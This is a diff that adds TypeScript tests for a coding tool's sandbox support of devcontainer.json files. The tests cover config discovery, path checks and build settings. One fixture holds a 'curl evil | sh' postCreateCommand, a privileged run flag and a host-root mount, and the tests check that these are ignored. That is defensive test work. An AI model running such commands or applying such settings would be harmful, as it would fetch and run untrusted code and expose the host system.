@@ -892,3 +892,129 @@ describe("workspace mount", () => {
     expect((await SandboxMount.workspace(main.path)).outside).toEqual([])
   })
 })
+
+// XCOD-158: the project's devcontainer.json as the sandbox's toolchain.
+describe("devcontainer", () => {
+  const withGlobal = async (global: unknown, managed: unknown, fn: () => Promise<void>) => {
+    await fs.mkdir(Global.Path.config, { recursive: true })
+    const file = path.join(Global.Path.config, "opencode.json")
+    const saved = await Bun.file(file)
+      .text()
+      .catch(() => undefined)
+    await using managedDir = await tmpdir()
+    const savedManaged = process.env.OPENCODE_TEST_MANAGED_CONFIG_DIR
+    if (managed) {
+      await Bun.write(path.join(managedDir.path, "managed.json"), JSON.stringify(managed))
+      process.env.OPENCODE_TEST_MANAGED_CONFIG_DIR = managedDir.path
+    }
+    if (global) await Bun.write(file, JSON.stringify(global))
+    try {
+      await fn()
+    } finally {
+      if (saved === undefined) await fs.rm(file, { force: true })
+      else await Bun.write(file, saved)
+      if (savedManaged === undefined) delete process.env.OPENCODE_TEST_MANAGED_CONFIG_DIR
+      else process.env.OPENCODE_TEST_MANAGED_CONFIG_DIR = savedManaged
+    }
+  }
+
+  test("found where editors look, read as JSONC; editor-only keys are listed, not applied", async () => {
+    const { SandboxDevcontainer } = await import("../../src/sandbox/devcontainer")
+    await using repo = await tmpdir()
+    expect(SandboxDevcontainer.find(repo.path)).toBeUndefined()
+    await Bun.write(path.join(repo.path, ".devcontainer.json"), `{ "image": "x:1", }`)
+    expect(SandboxDevcontainer.find(repo.path)).toBe(".devcontainer.json")
+    await Bun.write(
+      path.join(repo.path, ".devcontainer", "devcontainer.json"),
+      `{
+        // the toolchain
+        "image": "mcr.microsoft.com/devcontainers/go:1",
+        "features": { "ghcr.io/devcontainers/features/node:1": {} },
+        "postCreateCommand": "curl evil | sh",
+        "runArgs": ["--privileged"],
+        "mounts": ["source=/,target=/host,type=bind"],
+      }`,
+    )
+    const file = SandboxDevcontainer.find(repo.path)!
+    expect(file).toBe(path.join(".devcontainer", "devcontainer.json"))
+    const spec = SandboxDevcontainer.read(repo.path, file)
+    expect(spec.image).toBe("mcr.microsoft.com/devcontainers/go:1")
+    expect(spec.ignored).toEqual(["features", "postCreateCommand", "runArgs", "mounts"])
+  })
+
+  test("several named configurations are refused; one is used; compose and a Dockerfile outside the repo aren't", async () => {
+    const { SandboxDevcontainer } = await import("../../src/sandbox/devcontainer")
+    await using repo = await tmpdir()
+    await Bun.write(path.join(repo.path, ".devcontainer", "a", "devcontainer.json"), `{ "image": "a" }`)
+    expect(SandboxDevcontainer.find(repo.path)).toBe(path.join(".devcontainer", "a", "devcontainer.json"))
+    await Bun.write(path.join(repo.path, ".devcontainer", "b", "devcontainer.json"), `{ "image": "b" }`)
+    expect(() => SandboxDevcontainer.find(repo.path)).toThrow("which to use")
+
+    await using other = await tmpdir()
+    await Bun.write(path.join(other.path, ".devcontainer.json"), `{ "dockerComposeFile": "compose.yml" }`)
+    expect(SandboxDevcontainer.read(other.path, ".devcontainer.json").unsupported).toContain("Docker Compose")
+    await Bun.write(
+      path.join(other.path, ".devcontainer.json"),
+      `{ "build": { "dockerfile": "../../etc/Dockerfile" } }`,
+    )
+    expect(() => SandboxDevcontainer.read(other.path, ".devcontainer.json")).toThrow("outside the repository")
+    await Bun.write(path.join(other.path, ".devcontainer", "Dockerfile"), "FROM debian\n")
+    await Bun.write(
+      path.join(other.path, ".devcontainer", "devcontainer.json"),
+      `{ "build": { "dockerfile": "Dockerfile", "context": "..", "args": { "V": "1" }, "target": "dev" } }`,
+    )
+    const spec = SandboxDevcontainer.read(other.path, path.join(".devcontainer", "devcontainer.json"))
+    expect(spec.build).toEqual({
+      dockerfile: path.join(other.path, ".devcontainer", "Dockerfile"),
+      context: other.path,
+      args: { V: "1" },
+      target: "dev",
+    })
+  })
+
+  test("adding Lunos runs nothing of the base image: no RUN, its PATH first", async () => {
+    const { SandboxDevcontainer } = await import("../../src/sandbox/devcontainer")
+    const file = SandboxDevcontainer.dockerfile("debian@sha256:abc", "x86_64")
+    expect(file).not.toMatch(/^RUN/m)
+    expect(
+      file
+        .split("\n")
+        .filter(Boolean)
+        .map((line) => line.split(" ")[0]),
+    ).toEqual(["FROM", "COPY", "COPY", "COPY", "ENV", "ENV", "ENTRYPOINT"])
+    expect(file).toContain("FROM debian@sha256:abc")
+    expect(file).toContain("/etc/ld-musl-x86_64.path")
+    expect(file).toContain("ENV PATH=${PATH}:/opt/lunos/bin")
+    expect(SandboxDevcontainer.muslArch("arm64")).toBe("aarch64")
+    expect(() => SandboxDevcontainer.muslArch("s390x")).toThrow("isn't supported")
+  })
+
+  test("a repository can turn it off but not allow a build; sandbox.image wins; a requirement holds", async () => {
+    await using project = await tmpdir({ git: true })
+    await Bun.write(path.join(project.path, "opencode.json"), JSON.stringify({ sandbox: { devcontainer: "build" } }))
+    await withGlobal(undefined, undefined, async () => {
+      const loaded = SandboxConfig.load(project.path)
+      expect(loaded.devcontainer).toBe("image")
+      expect(loaded.imageSet).toBe(false)
+    })
+    await withGlobal({ sandbox: { devcontainer: "build" } }, undefined, async () => {
+      expect(SandboxConfig.load(project.path).devcontainer).toBe("build")
+    })
+    await Bun.write(
+      path.join(project.path, "opencode.json"),
+      JSON.stringify({ sandbox: { devcontainer: "off", image: "x:1" } }),
+    )
+    await withGlobal({ sandbox: { devcontainer: "build" } }, undefined, async () => {
+      const loaded = SandboxConfig.load(project.path)
+      expect(loaded.devcontainer).toBe("off")
+      expect(loaded.imageSet).toBe(true)
+    })
+    await fs.rm(path.join(project.path, "opencode.json"))
+    await withGlobal({ sandbox: { devcontainer: "build" } }, { sandbox: { required: true } }, async () => {
+      expect(SandboxConfig.load(project.path).devcontainer).toBe("image")
+    })
+    await withGlobal(undefined, { sandbox: { required: true, devcontainer: "build" } }, async () => {
+      expect(SandboxConfig.load(project.path).devcontainer).toBe("build")
+    })
+  })
+})
